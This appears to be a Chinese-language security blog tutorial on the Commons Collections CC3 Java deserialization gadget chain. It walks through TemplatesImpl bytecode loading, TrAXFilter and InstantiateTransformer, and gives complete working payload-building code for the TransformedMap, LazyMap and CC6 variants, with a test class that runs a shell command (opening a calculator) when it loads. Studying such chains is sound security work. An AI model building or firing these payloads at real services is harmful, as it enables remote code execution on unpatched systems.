---
title: "Java反序列化-CC3"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# java反序列化链-CC3

简单理解，CC3就是CC1+TemplatesImpl动态加载字节码

## demo

先看cc1的简单demo：

~~~java
package com.yuy0ung;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]{"open -a calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }
}
~~~

我们将其结合上动态加载字节码，就是在InvokerTransformer中做手脚：

~~~java
package com.yuy0ung;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3_demo {
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(obj),
                new InvokerTransformer("newTransformer", null, null),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }
}
~~~

此时就是一个CC1+TemplatesImpl动态加载字节码的demo了，运行试试：

![image-20251029105456714](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251029105456714.png)

可以看见这里成功加载字节码并输出字符串

CC3的另一个作用是绕过对InvokerTransformer的限制，所以我们还需要找到一个能代替InvokerTransformer的类

## TrAXFilter

CommonsCollections3并没有使⽤到InvokerTransformer来调⽤任意⽅法，⽽是⽤到了另⼀个类叫`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`的类

这个类的构造方法就调用了newTransformer()，省去了使用InvokerTransformer来调用的步骤：

![QQ_1761706993991](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761706993991.png)

但是没了InvokerTransformer，TrAXFilter的构造⽅法也是⽆法调⽤的，所以要找一个新的Transformer

这里使用到`org.apache.commons.collections.functors.InstantiateTransformer`，他也是⼀个实现了Transformer接⼝的类，他的作⽤就是调⽤构造⽅法:
![QQ_1761709405384](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761709405384.png)

所以思路就是：InstantiateTransformer调用TrAXFilter的构造⽅法，TrAXFilter调用newTransformer，newTransformer调用到TemplatesImpl动态加载字节码

于是得到如下调用链：

~~~java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
};
~~~

替换到原demo中依然是可以运行的：

![image-20251029115416315](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251029115416315.png)

那么接下来开始着手构造反序列化调用链

## 构造-CC1

### TransformedMap

首先是CC1的TransformedMap链：

~~~java
package com.yuy0ung;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import javassist.ClassPool;

public class CommonsCollections3_cc1 {
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
        TemplatesImpl tmpl = new TemplatesImpl();
        setFieldValue(tmpl, "_bytecodes", new byte[][] {code});
        setFieldValue(tmpl, "_name", "HelloTemplatesImpl");
        setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "Yuy0ung");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Target.class, outerMap);

        serialize(obj);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
~~~

另外这里使用了javassist的classpool来加载字节码，RCETest类的内容如下（还记得前面说的么，TemplatesImpl 中加载的字节码对应的类必须是 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的子类，我们这里要继承并重写一下transform方法）：

~~~java
package com.yuy0ung;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class RCETest extends AbstractTranslet {

    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
~~~

运行，成功加载字节码触发命令执行：

![QQ_1761718088207](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761718088207.png)

### LazyMap

然后是LazyMap链，换汤不换药：

~~~java
package com.yuy0ung;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3_cc1_LazyMap {
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
        TemplatesImpl tmpl = new TemplatesImpl();
        setFieldValue(tmpl, "_bytecodes", new byte[][] {code});
        setFieldValue(tmpl, "_name", "HelloTemplatesImpl");
        setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "Yuy0ung");
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)constructor.newInstance(Target.class, outerMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);

        Object obj = constructor.newInstance(Target.class, proxyMap);

        serialize(obj);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
~~~

运行，成功加载字节码触发命令执行：

![QQ_1761718828523](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761718828523.png)

我们已知CC1只能在java 8u65以下利用而CC6可以通杀java7和java8且思路相似，于是我们再利用CC6构造一次

## 构造-CC6

同理了，很简单：

~~~java
package com.yuy0ung;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3_cc6 {
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
        TemplatesImpl tmpl = new TemplatesImpl();
        setFieldValue(tmpl, "_bytecodes", new byte[][] {code});
        setFieldValue(tmpl, "_name", "HelloTemplatesImpl");
        setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "Yuy0ung");
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "Yuy0ung");

        Map evilMap = new HashMap();
        evilMap.put(tme,"Yuy1ung");

        outerMap.remove("Yuy0ung");
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);

        serialize(evilMap);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
~~~

运行，成功加载字节码触发命令执行：

![QQ_1761719182099](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761719182099.png)

这一个链子就是能够通杀java7和java8的了

## 总结

CC3其实换汤不换药，就是使用CC1/CC6的链子去触发Templates动态加载字节码，实现触发命令执行
